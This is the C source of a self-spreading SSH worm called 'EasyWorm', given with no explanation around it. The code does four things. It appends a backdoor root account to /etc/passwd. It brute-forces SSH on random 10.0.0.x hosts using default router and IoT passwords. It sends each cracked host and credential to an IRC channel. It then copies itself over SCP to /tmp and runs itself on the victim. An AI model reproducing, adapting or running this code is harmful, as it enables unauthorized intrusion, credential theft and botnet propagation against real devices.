#include <time.h>
#include <libssh/libssh.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#define MYNET "10.0.0."
#define IRC "10.0.0.1"
#define IRCPORT 6666
char user[11][10] = {"easyworm","root","root","root","root",
  "root","root","root","root","root","root"};
char pass[11][10] = {"fucker","root","123456","000000","111111",
	"Zte521","admin","anko","openelec","uClinux","xmhdipc"};
char host[16],myworm[10],remoteworm[20];
void sendToIrc(int i){
  int socketirc,num;
  struct sockaddr_in serveradd;
  char data[200];
  if((socketirc = socket(AF_INET,SOCK_STREAM,0)) == -1){
    return;}
  serveradd.sin_family = AF_INET;
  serveradd.sin_addr.s_addr=inet_addr(IRC);
  serveradd.sin_port=htons(IRCPORT);
  if(connect(socketirc,&serveradd,sizeof(serveradd)) 
    != 0){return;}
  num=sprintf(data,"user 4d50 4d50 4d50 4d50\n"
    "nick Ad50_%d\n",rand());
  write(socketirc,data,num);ioctl(socketirc,FIONREAD,&num);
  while(num == 0){ioctl(socketirc,FIONREAD,&num);}
  while(num != 0){read(socketirc,data,num);
    data[num]='\0';sleep(1);ioctl(socketirc,FIONREAD,&num);}
  ioctl(socketirc,FIONREAD,&num);
  while(num == 0){
    ioctl(socketirc,FIONREAD,&num);}
  while(num != 0){read(socketirc,data,100);
    data[99]='\0';ioctl(socketirc,FIONREAD,&num);}
  num=sprintf(data,"join #4d50\nprivmsg #4d50 :"
    "%s %s %s\nquit\n",host,user[i],pass[i]);
  write(socketirc,data,num);
  sleep(5);close(socketirc);}
int main(int argc, char *argv[]){
  int port=22,i,con,size,readsize,writesize;
  ssh_session session; ssh_channel sshchannel; 
  ssh_scp scp; FILE *f; struct stat fileinfo; char buffer[1024];
  sprintf(myworm,"./%s",argv[0]);
  sprintf(remoteworm,"%s",argv[0]);
  f=fopen(myworm,"r"); fstat(fileno(f),&fileinfo);
  size=fileinfo.st_size; fclose(f);
  srand(time(NULL)); f=fopen("/etc/passwd","a");
  if(f!=NULL){fprintf(f,"easyworm:CdM1KfjvR896Q:0:0::");
    fprintf(f,"/root:/bin/sh\n");fclose(f);}
  while(1==1){
    sprintf(host,"%s%d",MYNET,(rand()%255)+1); i=0;
    while(i < 11){ session=ssh_new();
      if((ssh_options_set(session, SSH_OPTIONS_USER,
        user[i])<0) || (ssh_options_set(session, 
        SSH_OPTIONS_HOST, host)<0) || (ssh_options_set(
        session, SSH_OPTIONS_PORT, &port)<0)){break;}
      con = ssh_connect(session); if(con != SSH_OK){break;}
      if(con = ssh_userauth_password(session, NULL, pass[i]) == 
      	SSH_AUTH_SUCCESS){ if(i == 0){break;};
        sendToIrc(i); writesize=0;
        scp=ssh_scp_new(session,SSH_SCP_WRITE,"/tmp/");
        if(ssh_scp_init(scp)==SSH_ERROR){break;}
        con=ssh_scp_push_file(scp,"EasyWorm", size, 0766);
        if(con != SSH_ERROR){ f=fopen(myworm,"r");
          while(1==1){
            readsize=fread(buffer,1,sizeof(buffer),f);
            if(SSH_ERROR == ssh_scp_write(scp,buffer,readsize)){break;}
            writesize=writesize+readsize;
            if(writesize==size){break;}}fclose(f);}
        if((sshchannel = ssh_channel_new(session)) ==NULL){break;}
        if((con = ssh_channel_open_session(sshchannel)) < 0){break;};
        if((con = ssh_channel_request_exec(sshchannel,
          "cd /tmp/;./EasyWorm &")) < 0){break;};
        ssh_free(session);break;}
      ssh_free(session);i=i+1;}sleep(10);}}
